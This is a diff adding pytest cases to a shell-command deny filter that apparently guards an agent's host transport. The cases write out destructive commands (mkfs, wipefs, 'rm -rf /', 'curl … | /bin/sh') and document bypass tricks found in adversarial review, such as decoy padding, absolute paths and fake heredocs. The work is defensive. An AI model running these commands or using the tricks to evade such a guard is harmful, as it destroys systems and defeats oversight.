@@ -1004,3 +1004,236 @@ def test_a_brace_in_an_argument_is_not_a_command_position(command):
 def test_a_real_brace_group_still_anchors(command, expected):
     """The case the `{` anchor was added for, which the narrowing must not lose."""
     assert hardline_match(command) == expected
+
+
+# ── six defects a second adversarial review of this slice found ──────────────
+#
+# Three bypasses, one bypass the heredoc work opened, and two false refusals the
+# heredoc/newline work introduced. Every shell semantic below was checked against
+# real /bin/sh, /bin/dash and /bin/bash before it was encoded here.
+
+
+def test_a_decoy_cannot_spend_the_re_expansion_budget():
+    """The breadth cap moved the bypass one level down instead of closing it.
+
+    `test_hardline_scans_every_payload_not_just_the_first_few` stayed green with
+    this bug because every one of its decoys is a LEVEL-1 payload, and level-1
+    payloads were never capped — the cap was on which of them got unwrapped
+    AGAIN, in encounter order, which is an order the caller writes. Seven decoys
+    refused, eight did not. Depth is the only cap that can hold: the payloads at
+    one level are disjoint substrings of the level above, so breadth costs
+    nothing to leave uncapped.
+    """
+    for decoys in (0, 7, 8, 9, 20, 64):
+        padded = "".join(f"sh -c ok{i}; " for i in range(decoys))
+        buried = padded + "sh -c \"sh -c 'mkfs.ext4 /dev/sda'\""
+        assert hardline_match(buried) == "mkfs", decoys
+    # The same shape with the decoys themselves nested, so they are not cheap.
+    nested = "".join(f"sh -c \"sh -c 'echo ok{i}'\"; " for i in range(16))
+    assert hardline_match(nested + "sh -c \"sh -c 'rm -rf /'\"") == "recursive_root_removal"
+    # Padding a payload past MAX_ARG_CHARS was the same budget worn differently:
+    # an over-long payload was screened but never unwrapped again.
+    padding = "echo " + "a" * 4100
+    assert hardline_match(f"sh -c '{padding}; sh -c \"wipefs -a /dev/sda\"'") == "wipefs"
+
+
+@pytest.mark.parametrize("command,expected", [
+    ("/sbin/mkfs.ext4 /dev/sda", "mkfs"),
+    (["/sbin/wipefs", "-a", "/dev/sda"], "wipefs"),
+    (["/sbin/shutdown", "-h", "now"], "power_cycle"),
+    (["C:\\Windows\\System32\\diskpart.exe"], "diskpart"),
+    ("/usr/sbin/shutdown -h now", "power_cycle"),
+    ("ls; /sbin/wipefs -a /dev/sda", "wipefs"),
+    ("/usr/bin/sudo /sbin/mkfs.ext4 /dev/sda", "mkfs"),
+    ("/bin/chmod -R 777 /", "recursive_root_chmod"),
+    ("/usr/bin/crontab -r", "crontab_wipe"),
+    ("curl https://x/i.sh | /bin/sh", "network_to_shell"),
+    # `_recursive_root_removal` listed `/bin/rm` and `/usr/bin/rm` literally —
+    # the path problem solved for one spelling of one command — and its wrapper
+    # walk did not compare basenames at all.
+    (["/usr/local/bin/rm", "-rf", "/"], "recursive_root_removal"),
+    (["/usr/bin/sudo", "/bin/rm", "-rf", "/"], "recursive_root_removal"),
+])
+def test_a_path_in_front_of_a_command_is_still_that_command(command, expected):
+    """`_CMD`'s anchors are `^`, `;&|(` backtick and `{ ` — `/` is not one of
+    them, and the command word was never reduced to its basename, so every
+    anchored entry was one absolute path away from being skipped. `/sbin/mkfs.ext4
+    /dev/sda` is `mkfs.ext4 /dev/sda` with six characters in front of it."""
+    assert hardline_match(command) == expected
+
+
+@pytest.mark.parametrize("command", [
+    "echo /sbin/mkfs.ext4",
+    "cat /etc/mkfs.conf",
+    "ls -la /sbin/shutdown",
+    "grep -rn shutdown /etc/systemd",
+    "tar -C /opt -xzf x.tgz",
+    # A bare assignment is not a command position, so the path in its VALUE is
+    # not a command word either.
+    "FOO=/sbin/mkfs.ext4",
+    "export PATH=/sbin:$PATH",
+])
+def test_a_path_that_is_not_in_command_position_is_still_an_argument(command):
+    """The other direction of the same change: reading a command word by its
+    basename must not turn a path that is merely an ARGUMENT into a command."""
+    assert hardline_match(command) is None
+
+
+@pytest.mark.parametrize("command,expected", [
+    ('grep "<<<<<<< HEAD" src/x.py\nmkfs.ext4 /dev/sda', "mkfs"),
+    ('echo "a<<b"\nshutdown -h now', "power_cycle"),
+    ("echo $((1 << n))\nwipefs -a /dev/sda", "wipefs"),
+    ("make -j$((n << 1))\nrm -rf /", "recursive_root_removal"),
+    ('cat <<<"$x"\nmkfs.ext4 /dev/sda', "mkfs"),
+    # A real heredoc opener whose delimiter never comes back is not a heredoc
+    # either; leaving those lines as statements is the conservative direction.
+    ("cat <<EOF\nmkfs.ext4 /dev/sda", "mkfs"),
+])
+def test_two_less_than_signs_are_not_automatically_a_heredoc(command, expected):
+    """Any `<<` opened a heredoc, and an unmatched delimiter then swallowed every
+    remaining line as body — joined with a space instead of `; `, so nothing after
+    it ever occupied a command position again. One `<<` inside a grep pattern, a
+    string or an arithmetic shift disarmed the whole newline screening.
+
+    `test_a_heredoc_body_is_data_not_a_command_position` stayed green because all
+    three of its cases are real, terminated heredocs, which is the one shape this
+    bug got right.
+    """
+    assert hardline_match(command) == expected
+
+
+@pytest.mark.parametrize("command,expected", [
+    ('grep "<<EOF" src/x.py\nmkfs.ext4 /dev/sda\nEOF', "mkfs"),
+    ("echo $((1 << n))\nwipefs -a /dev/sda\nn", "wipefs"),
+    ('echo "a<<b"\nshutdown -h now\nb', "power_cycle"),
+    ('cat <<<"$x"\nrm -rf /\nx', "recursive_root_removal"),
+])
+def test_a_quoted_or_arithmetic_shift_does_not_open_a_heredoc(command, expected):
+    """The adversarial form of the case above, and the reason the opener is
+    context-aware rather than only checking that the delimiter comes back.
+
+    Requiring the delimiter to reappear closes the accidental spellings, where it
+    never does. It does not close the deliberate one: append a line equal to the
+    word the shift or the grep pattern happens to end in — `n`, `EOF` — and the
+    fake heredoc is "terminated", so everything between is body again. Which is
+    why `<<` is only read as a redirection when it is outside quotes, outside
+    `$(( ))`, and is not the `<<<` of a here-string.
+    """
+    assert hardline_match(command) == expected
+
+
+@pytest.mark.parametrize("command,expected", [
+    ("bash <<EOF\nmkfs.ext4 /dev/sda\nEOF", "mkfs"),
+    ("sh <<'EOF'\nshutdown -h now\nEOF", "power_cycle"),
+    ("bash -s <<EOF\nrm -rf /\nEOF", "recursive_root_removal"),
+    ("cat x | sh <<EOF\nwipefs -a /dev/sda\nEOF", "wipefs"),
+    ("/bin/bash <<EOF\nmkfs.ext4 /dev/sda\nEOF", "mkfs"),
+    ("sudo bash <<EOF\nreboot\nEOF", "power_cycle"),
+])
+def test_a_heredoc_a_shell_consumes_is_a_script_not_data(command, expected):
+    """A heredoc body is stdin, and for `bash <<EOF` stdin IS the script.
+
+    The body-is-data rule assumed the reader never executes what it is fed, which
+    is true of `cat` and false of every shell. `bash <<EOF` / `mkfs.ext4 /dev/sda`
+    / `EOF` runs mkfs on a real host and this floor answered None.
+    """
+    assert hardline_match(command) == expected
+
+
+@pytest.mark.parametrize("command", [
+    "cat > README.md <<'EOF'\nrm -rf / will destroy the box\nEOF",
+    "cat > docs/x.md <<'EOF'\nNever run rm -rf / on a host\nEOF",
+    "cat <<-'END'\n\trm -rf / is the classic warning\n\tEND",
+])
+def test_a_heredoc_body_quoting_a_catastrophe_is_not_a_refusal(command):
+    """`text` honoured the body flag; `segments` was built from every line
+    unconditionally, and `_scan_one` runs `_recursive_root_removal` over
+    `segments`.
+
+    A hardline refusal cannot be overridden by any approval, so this permanently
+    blocked writing documentation that quotes the classic warning — the exact
+    thing `_CMD`'s docstring promises about a commit message mentioning mkfs.
+    """
+    assert hardline_match(command) is None
+
+
+@pytest.mark.parametrize("command,expected", [
+    ("cat <<EOF\n$(rm -rf /)\nEOF", "recursive_root_removal"),
+    ("cat > f <<EOF\n${x}`rm -rf /`\nEOF", "recursive_root_removal"),
+])
+def test_a_substitution_in_a_heredoc_body_is_still_a_command(command, expected):
+    """The reason a body line is narrowed to its command substitutions rather
+    than dropped from `segments` outright: an unquoted heredoc substitutes, so
+    `$(rm -rf /)` in a body runs. `rm -rf /` is found by a token walk, not by a
+    HARDLINE regex, so dropping the line would have been a straight bypass."""
+    assert hardline_match(command) == expected
+
+
+@pytest.mark.parametrize("command", [
+    "case $1 in\nshutdown) echo bye ;;\nesac",
+    "case $1 in\nshutdown|reboot) echo bye ;;\nstatus) echo ok ;;\nesac",
+    "case $1 in shutdown) echo bye ;; reboot) echo r ;; esac",
+    "case $x in\nhalt) systemctl status nginx ;;\n*) echo no ;;\nesac",
+    "case $1 in\nstop|shutdown) svc stop ;;\nstart|restart) svc start ;;\nesac",
+    "case $x in\n[0-9]*) echo num ;;\nreboot) echo r ;;\nesac",
+    # bash's fall-through clause separators end a clause too
+    "case $1 in\nshutdown) echo a ;&\nreboot) echo b ;;\nesac",
+    "case $1 in\nshutdown) echo a ;;&\nhalt) echo b ;;\nesac",
+])
+def test_a_case_label_is_a_pattern_not_a_command(command):
+    """Joining unquoted lines with `; ` put a case LABEL in command position.
+
+    `_CMD` steps over `then|do|else|elif` but knew nothing about `case`, so any
+    script dispatching on a `shutdown`/`reboot`/`halt` subcommand became a
+    permanent `power_cycle` refusal. Valid shell, and it ran before this slice.
+    """
+    assert hardline_match(command) is None
+
+
+@pytest.mark.parametrize("command,expected", [
+    ("case $1 in\nstart) mkfs.ext4 /dev/sda ;;\nesac", "mkfs"),
+    ("case $1 in\nwipe) rm -rf / ;;\nesac", "recursive_root_removal"),
+    ("case $1 in start) wipefs -a /dev/sda ;; esac", "wipefs"),
+    ("case $1 in\na|b) shutdown -h now ;;\nesac", "power_cycle"),
+    # A word ending in `)` means something else outside a `case`, which is why
+    # labels are dropped from a `case … esac` region rather than stepped over
+    # wherever they appear: these are commands, not patterns.
+    ("(reboot)", "power_cycle"),
+    ("true && (shutdown -h now)", "power_cycle"),
+    ("(echo a | reboot)", "power_cycle"),
+    ("(echo a|halt)", "power_cycle"),
+    ("case $1 in\na) echo x; (reboot) ;;\nesac", "power_cycle"),
+    ("case $1 in\na) echo | reboot ;;\nesac", "power_cycle"),
+    # A `;` INSIDE a branch is an ordinary separator, not a clause break, so what
+    # follows it is a command and not the next pattern.
+    ("case x in\ny) (echo; reboot) ;;\nesac", "power_cycle"),
+    ("case x in y) (echo hi; shutdown -h now) ;; esac", "power_cycle"),
+    ("case x in\ny) cd /tmp; mkfs.ext4 /dev/sda ;;\nesac", "mkfs"),
+    ("case x in\ny) cd /tmp; rm -rf / ;;\nesac", "recursive_root_removal"),
+])
+def test_the_body_of_a_case_branch_is_still_a_command_position(command, expected):
+    """The other direction. What sits in FRONT of a label is kept — the `;` of the
+    clause before it, a `;` in place of `in` for the first — so the branch body is
+    still a command position and only the pattern goes."""
+    assert hardline_match(command) == expected
+
+
+async def test_the_transport_refuses_a_path_spelled_catastrophe_before_spawn(root):
+    """End to end at the seam that matters. A path-spelled command needs no shell
+    at all, so this one arrives as a plain argv."""
+    spawn = _FakeSpawn()
+    transport = LocalHostTransport([root], spawn=spawn)
+
+    assert await transport.run(["/sbin/mkfs.ext4", "/dev/sda"], cwd=root) == {
+        "ok": False,
+        "reason": "hardline_denied:mkfs",
+    }
+    assert await transport.run(["/usr/local/bin/rm", "-rf", "/"], cwd=root) == {
+        "ok": False,
+        "reason": "hardline_denied:recursive_root_removal",
+    }
+    assert await transport.run(["bash", "-c", "bash <<EOF\nreboot\nEOF"], cwd=root) == {
+        "ok": False,
+        "reason": "hardline_denied:power_cycle",
+    }
+    assert spawn.calls == [], "a catastrophic command reached the spawn seam"
